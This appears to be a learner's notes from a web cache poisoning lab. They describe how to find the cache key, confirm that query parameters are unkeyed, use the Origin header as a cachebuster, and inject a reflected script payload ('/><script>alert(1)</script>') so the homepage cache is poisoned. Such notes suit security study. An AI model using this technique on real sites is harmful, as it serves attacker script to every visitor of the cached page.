/*

1) Pragma: x-get-cache-key
// X-Cache-Key: /$$

2) Adding arbitrary query parameters to URL still leads to a cache hit
GET /url?lin=111 HTTP/2

// this means they are not keyed

3) Origin: L
// ORIGIN header acts as a cachebuster

X-Cache-Key: /url$$origin=L

4) GET /?url='/><script>alert(1)</script> HTTP/2
//breaking out of the HTML

5) poison the homepage
send the earlier request, to get a cache hit 
then send again by removing the query parameter
then again by removing the cachebuster and add the query again GET /?url='/><script>alert(1)</script> HTTP/2



*/